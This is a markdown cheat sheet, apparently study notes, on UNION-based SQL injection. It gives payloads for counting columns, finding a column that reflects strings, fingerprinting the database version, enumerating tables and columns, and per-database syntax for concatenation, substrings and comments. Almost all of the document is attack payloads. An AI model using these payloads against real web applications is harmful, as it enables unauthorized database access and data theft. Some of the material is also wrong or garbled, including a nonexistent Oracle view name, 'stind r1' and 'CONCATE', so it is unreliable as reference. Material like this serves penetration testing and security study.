## find number of columns vulnerable to SQL I
1. use order by 1 (integer ) and increment until error goes on
this will give us the number of columns that are returning
2. or another  method is UNION Select NULL,NULL --  "if number of null DOESN'T match then DB gives error"
#### note for Oracle Database 
always use **From Dual --** in select query because it is the builtin table in oracle.

## find the column which gives us the string value in return 
```bash
Query= 'UNION SELECT NULL,"A"+--+'
```
OR
```bash
query = ' UNION SELECT "A",NULL --+'
```
(if returns our string value in any columns that is data retrival point we can say)

## find DataBase Type and Version
|Database | Query |
|---|---|
|Microsoft | 'Select @@version'|
|MySQL |'Select @@version'|
|Oracle | 'Select \* from v\$Version'|
|PostgreSQL| 'Select version()'|

## listing content of DB 
#### Listing tables 
```bash
Query= 'information_schema.tables' 
```
(list out the table names in the database)
#### listing columns
```bash
Query= ' Select * from information_schema.columns Where table_name="table name we know" '
```
***NOTE:  always use + instead of (space)***

### For Oracle DataBase

**For tables**
```bash
Query= 'Select * from all_tables '
```
**For columns** 
```bash
Query= 'Select * from all_tables_columns where table_name="table name"'
```
## String Concation 
***used for concatenation multiple string in the single string***

|***Database* **| ***Method for concate***|
|---|---|
|**Oracle **|** 'str1'  \| \|'str2'** |
|**Microsoft** |** 'str1'+str2**|
|**PostgreSQL**|**'stind r1' \|\|'str2'**|
|**MySql** | **'str1'(space)'str2'  OR CONCATE('str1','str2')**|

## Sub-string or retrieve part of the string
|DataBase| Query|
|---|---|
|Oracle |SUBSTR('the payload to return string or string', index_of_string, number_of_charector_to retrive)|
|Microsoft|SUBSTRING('STRING ', Index, number of character)|
|PostgreSQL| SUBSTRING('string', index, character)|
|MySQL| SUBSTRING('string', index, character)|

## Comments in SQL
|DataBase|Comment|
|---|---|
|Oracle|'--'|
|Microsoft|'--'and /\*\*/|
|PostgreSql|'--' and /\*\*/ |
|MySQL| \# , --(white space), /\*\*/ |

